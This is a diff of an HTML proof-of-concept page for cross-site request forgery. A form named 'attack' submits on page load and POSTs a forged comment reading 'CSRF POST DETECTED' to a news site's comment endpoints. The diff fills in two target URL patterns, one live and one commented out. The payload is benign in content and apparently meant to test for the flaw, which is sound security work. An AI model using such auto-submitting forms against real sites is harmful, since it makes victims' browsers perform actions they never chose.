@@ -21,17 +21,24 @@
 </script>
 
 <!--
-http://www.test.com/?pag=news&str=VIEW&id=ID-HERE&cmd=comment
-OR
-https://www.test.com/site/index.php/news/comments/add/ID-HERE
-
 The ID can be found in the source code of the page
 -->
 
 <body onload="start();">
-<form action="URL-HERE" name="attack" method="POST" target="_blank">
+
+<!-- Method 1 -->
+<form action="http://www.test.com/?pag=news&str=VIEW&id=ID-HERE&cmd=comment" name="attack" method="POST" target="_blank">
     <input type="text" name="Character" value="CSRF">
     <input type="text" name="Text" value="CSRF POST DETECTED">
     <input type="hidden" name="action" value="true">
     <input type="submit" value="Send">
 </form>
+    
+<!-- Method 2
+
+<form action="https://www.test.com/site/index.php/news/comments/add/ID-HERE" name="attack" method="POST" target="_blank">
+    <input type="text" name="comment" value="CSRF POST DETECTED">
+    <input type="hidden" name="action" value="true">
+    <input type="submit" value="Send">
+</form>
+-->
